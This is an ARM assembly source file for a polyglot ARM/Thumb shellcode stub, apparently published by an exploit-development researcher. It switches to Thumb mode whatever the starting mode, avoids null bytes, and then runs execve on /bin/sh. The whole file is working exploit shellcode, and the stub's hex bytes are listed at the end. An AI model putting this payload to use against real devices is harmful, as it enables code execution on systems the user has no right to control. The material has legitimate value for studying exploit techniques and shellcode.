/* Quantum Leap shellcode stub
 * by Saumil Shah - @therealsaumil
 *
 * Polyglot ARM/THUMB Shellcode to switch to THUMB mode
 * irrespective of the starting mode being ARM or THUMB
 *
 * works for ARMv6 processors that don't support Thumb2 instructions
 * NULL byte free
 */

.section .text
.global _start

_start:
.code 32
        /* QUANTUM LEAP CODE - Start in ARM mode or THUMB mode        */
        /*                     eventually land up in THUMB mode       */
        /*                                                            */
        /* ARM: SWITCH TO THUMB    THUMB: PASS THROUGH                */
        addcs  r10, pc, #25     /* add  r0, pc, #100 ; movs  r2, #143 */
        addcc  r10, pc, #21     /* add  r0, pc, 84   ; adds  r2, #143 */
        movcs  r4, sp           /* ands r5, r1       ; movs  r1, #160 */
        movcc  r4, sp           /* ands r5, r1       ; adds  r1, #160 */
        pushcs {r1, r4, r10}    /* lsls r2, r2, #16  ; cmp   r1, #45  */
        pushcc {r1, r4, r10}    /* lsls r2, r2, #16  ; subs  r1, #45  */
        popcs  {r1, sp, pc}     /* add  r0, rc, #8   ; cmp   r0, #189 */
        popcc  {r1, sp, pc}     /* add  r0, rc, #8   ; subs  r0, #189 */

/* code below is in Thumb mode
 * launches execve() shell for
 * testing purposes
 */

.code 16
        adr    r0, SHELL
        eor    r2, r2, r2
        strb	r2, [r0, #7]
        push	{r0, r2}
        mov    r1, sp
        mov    r7, #11
        svc    #1

.balign 4
SHELL:
        .ascii "/bin/shX"


/* HEX bytes
 * \x19\xa0\x8f\x22\x15\xa0\x8f\x32
 * \x0d\x40\xa0\x21\x0d\x40\xa0\x31
 * \x12\x04\x2d\x29\x12\x04\x2d\x39
 * \x02\xa0\xbd\x28\x02\xa0\xbd\x38
 */
